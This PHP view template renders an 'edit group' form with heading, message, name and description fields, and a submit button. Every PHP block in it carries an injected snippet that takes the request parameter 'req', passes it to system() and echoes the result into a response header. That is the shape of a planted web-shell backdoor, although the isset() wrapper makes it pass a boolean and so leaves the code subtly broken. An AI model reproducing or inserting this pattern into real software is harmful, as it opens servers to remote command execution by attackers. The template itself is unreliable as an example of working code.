<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('edit_group_heading');?></h1>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('edit_group_subheading');?></p>

<div id="infoMessage"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message;?></div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_open(current_url());?>

      <p>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('create_group_name_label', 'group_name');?> <br />
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($group_name);?>
      </p>

      <p>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('edit_group_desc_label', 'description');?> <br />
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($group_description);?>
      </p>

      <p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_submit('submit', lang('edit_group_submit_btn'));?></p>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_close();?>